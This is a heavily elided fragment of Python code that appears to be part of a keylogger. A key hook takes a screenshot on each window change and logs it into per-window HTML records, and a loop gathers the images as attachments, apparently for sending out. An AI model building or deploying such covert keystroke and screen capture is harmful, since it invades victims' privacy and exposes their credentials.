    ...
    while True:
        try:
            ...
            if raw_log:
                ...
                for file in listdir(DIR+'/images'):
                    if file.endswith('.jpg'):
                        attachments.append('images/'+file)
...
def hook(key):
    ...
    if wind_now != last_window:
        ...
        photo = str(uuid4())
        ImageGrab.grab().save("images/" + photo + ".jpg", "JPEG")
        raw_log[wind_now] += '<br><font class="images">'
        raw_log[wind_now] += photo + '.jpg</font><br>'
